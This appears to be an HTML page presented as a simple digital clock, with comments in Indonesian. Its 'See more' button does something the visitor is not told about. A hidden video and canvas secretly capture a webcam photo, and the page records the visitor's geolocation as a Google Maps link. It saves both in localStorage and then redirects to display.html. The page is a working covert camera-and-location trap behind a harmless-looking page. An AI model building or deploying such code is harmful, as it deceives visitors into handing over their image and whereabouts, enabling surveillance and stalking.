<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Digital Clock with Automatic Photo and Location</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #000000, #333333);
      color: white;
      font-family: 'Roboto', sans-serif;
      text-align: center;
      overflow: hidden;
    }
    .clock {
      font-size: 60px;
      margin-bottom: 20px;
    }
    button {
      padding: 10px 20px;
      background-color: #00aaff;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background-color: #007acc;
    }
    footer {
      margin-top: 20px;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <div class="clock" id="clock">00:00:00</div>
  <video id="video" autoplay style="display: none;"></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <button id="locationBtn">Lihat Selengkapnya</button>

  <footer>Modern Digital Clock</footer>

  <script>
    function updateClock() {
      const now = new Date();
      const hours = String(now.getHours()).padStart(2, '0');
      const minutes = String(now.getMinutes()).padStart(2, '0');
      const seconds = String(now.getSeconds()).padStart(2, '0');
      document.getElementById('clock').textContent = `${hours}:${minutes}:${seconds}`;
    }
    setInterval(updateClock, 1000);
    updateClock();

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Akses kamera untuk mengambil foto
    function requestCameraAccess() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then((stream) => {
            video.srcObject = stream;

            setTimeout(() => {
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              const imageData = canvas.toDataURL('image/png');
              saveVisitorData(imageData);
            }, 3000);
          })
          .catch(error => {
            alert('Unable to access camera: ' + error.message);
          });
      }
    }

    // Akses lokasi pengguna
    function requestLocationAccess() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const mapsURL = `https://www.google.com/maps?q=${latitude},${longitude}`;
            saveLocationData(latitude, longitude, mapsURL);
            redirectToDisplay();
          },
          (error) => {
            alert('Unable to access location: ' + error.message);
          }
        );
      } else {
        alert('Geolocation is not supported by your browser.');
      }
    }

    // Simpan data pengunjung di localStorage
    function saveVisitorData(imageData) {
      const visitorData = {
        timestamp: new Date(),
        cameraImage: imageData,
      };
      const visitors = JSON.parse(localStorage.getItem('visitors')) || [];
      visitors.push(visitorData);
      localStorage.setItem('visitors', JSON.stringify(visitors));
    }

    // Simpan data lokasi
    function saveLocationData(latitude, longitude, mapsURL) {
      const visitors = JSON.parse(localStorage.getItem('visitors')) || [];
      if (visitors.length > 0) {
        visitors[visitors.length - 1].location = mapsURL;
        visitors[visitors.length - 1].latitude = latitude;
        visitors[visitors.length - 1].longitude = longitude;
      }
      localStorage.setItem('visitors', JSON.stringify(visitors));
    }

    // Redirect ke halaman display
    function redirectToDisplay() {
      window.location.href = 'display.html';
    }

    document.getElementById('locationBtn').addEventListener('click', () => {
      requestCameraAccess();
      requestLocationAccess();
    });
  </script>
  
</body>
</html>
